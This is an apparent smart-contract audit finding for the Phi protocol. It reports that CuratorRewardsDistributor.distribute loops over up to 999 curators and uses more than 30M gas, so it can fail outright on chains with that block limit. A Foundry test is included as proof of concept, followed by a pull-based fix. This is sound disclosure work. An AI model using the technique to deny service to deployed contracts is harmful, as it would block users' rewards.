# Vulnerability details

## Impact
Each credential can have multiple instances (up to 999), so for one `credId`, there could be up to 999 different addresses that own some portion of it. The `CuratorRewardsDistributor` contract allows rewards to be distributed between the curators of a credential and the protocol itself (https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/CuratorRewardsDistributor.sol#L84). However, a problem arises due to the number of operations performed in a single transaction. Users cannot control how many curators will receive rewards, as the rewards are distributed to all of them (https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/CuratorRewardsDistributor.sol#L106-L116). Here’s the function used to retrieve all curators for a given `credId` - https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L906-L934. This leads to high gas consumption, and since some chains have strict block limits, this can result in a DoS issue, where the transaction fails because it exceeds the block’s gas limit on certain EVM chains that the protocol intends to launch on.

For example:
 - Ethereum (30m block limit) https://docs.optimism.io/chain/differences#:~:text=30%2C000%2C000%20gas,30%2C000%2C000%20gas
- Optimism (30m block limit) https://docs.optimism.io/chain/differences#:~:text=30%2C000%2C000%20gas,30%2C000%2C000%20gas
- BeraChain (30m block limit) https://docs.berachain.com/learn/help/faqs#:~:text=Block%20gas%20limit%20(30m

## Proof of Concept
Insert into Cred.t.sol:

```solidity
  function testDos999() public {
        uint256 credId = 1;
        bytes32 merkleRoot = 0xdc4c272ceaa7b5ba9e0f3f9972f735f14e1b4ed191e15d0d17afc62792226428;

        // Create the initial cred
        _createCred("ADVANCED", "MERKLE", merkleRoot);

        address[] memory buyers = new address[](998);

        vm.warp(START_TIME + 1);
        // Buy one by one up to 998
        for (uint256 i = 0; i < 998; i++) {
            address buyer = makeAddr(string(abi.encodePacked("buyer", i)));
            buyers[i] = buyer;
            vm.deal(buyer, 11_000 ether);

            vm.startPrank(buyer);
            uint256 currentSupply = cred.credInfo(credId).currentSupply;
            uint256 buyAmount = 1;
            uint256 price = bondingCurve.getBuyPriceAfterFee(credId, currentSupply, buyAmount);

            cred.buyShareCred{ value: price }(credId, buyAmount, 0);

            assertEq(cred.getShareNumber(credId, buyer), buyAmount);
            assertEq(cred.credInfo(credId).currentSupply, currentSupply + buyAmount);
            vm.stopPrank();
        }
        address depositor = makeAddr("depositor");
        deal(depositor, 10 ether);
        vm.startPrank(depositor);
        curatorRewardsDistributor.deposit{value:5 ether}(credId, 5 ether);
        uint gasBefore = gasleft();
        // @audit-medium functions consumes about 32 mil gas which is too large enough for some EVM chains like:
        // - Ethereum (30m block limit) https://docs.optimism.io/chain/differences#:~:text=30%2C000%2C000%20gas,30%2C000%2C000%20gas
        // - Optimism (30m block limit) https://docs.optimism.io/chain/differences#:~:text=30%2C000%2C000%20gas,30%2C000%2C000%20gas
        // - BeraChain (30m block limit) https://docs.berachain.com/learn/help/faqs#:~:text=Block%20gas%20limit%20(30m
        curatorRewardsDistributor.distribute(credId);
        uint gasAfter = gasleft();
        uint consumedGas = gasBefore - gasAfter;
        uint MAX_GAS_LIMIT = 30_000_000;
        console2.log("Consumed gas = ", consumedGas); //  Consumed gas =  32_817_193
        assertGt(consumedGas, MAX_GAS_LIMIT);
        vm.stopPrank();
    }
```


## Tools Used

Foundry.

## Recommended Mitigation Steps
Change the scheme to be pull-based rather than push-based, so that curators can claim rewards only for themselves or decrease cred supply to lower number.


## Assessed type

DoS
